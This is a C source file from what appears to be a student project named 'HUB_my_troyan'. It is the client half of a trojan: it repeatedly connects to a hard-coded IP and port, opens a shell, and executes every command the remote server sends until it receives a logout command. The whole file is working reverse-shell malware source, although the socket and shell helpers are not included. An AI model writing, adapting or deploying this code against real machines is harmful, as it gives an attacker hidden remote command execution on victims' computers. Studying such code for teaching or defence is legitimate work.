/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 30/04/2021 client.c
*/

#include "client.h"

bool loop = true;

static int init(client_t *client)
{
    do {
        if (socket_client_ip_connect(&client->socket, PORT, IP)
            == EXIT_SUCCESS) {
            write_in_log(1, "Connected to server\n");
            break;
        }
        write_in_log(1, "Waiting to connect\n");
        sleep(2);
    } while (loop);
    client->is_connected = true;
    write_in_log(1, "Init shell\n");
    if (shell_client_init(&client->socket, &client->shell) == EXIT_FAILURE)
        return EXIT_FAILURE;
    return EXIT_SUCCESS;
}

static int client_loop(client_t *client)
{
    bool is_empty = false;
    char *command = socket_receive(&client->socket, &is_empty);

    if (!command && is_empty)
        return EXIT_QUIT;
    if (!command)
        return EXIT_SUCCESS;
    write_in_log(3, "Command received : {", command, "}\n");
    if (is_command(command, LOGOUT_CMD)) {
        free(command);
        return EXIT_QUIT;
    }
    if (send_shell_command(&client->shell, command) == EXIT_FAILURE) {
        free(command);
        write_in_log(1, "Fail to execute the command\n");
        return EXIT_SUCCESS;
    }
    free(command);
    return EXIT_SUCCESS;
}

static void client_destroy(client_t *client)
{
    write_in_log(1, "Shutdown application\n");
    socket_close(&client->socket);
    shell_stop(&client->shell);
}

int client(void)
{
    client_t client;

    if (init(&client) == EXIT_FAILURE)
        return EXIT_FAILURE;
    while (loop) {
        if (client_loop(&client) == EXIT_QUIT) {
            break;
        }
    }
    client_destroy(&client);
    return EXIT_SUCCESS;
}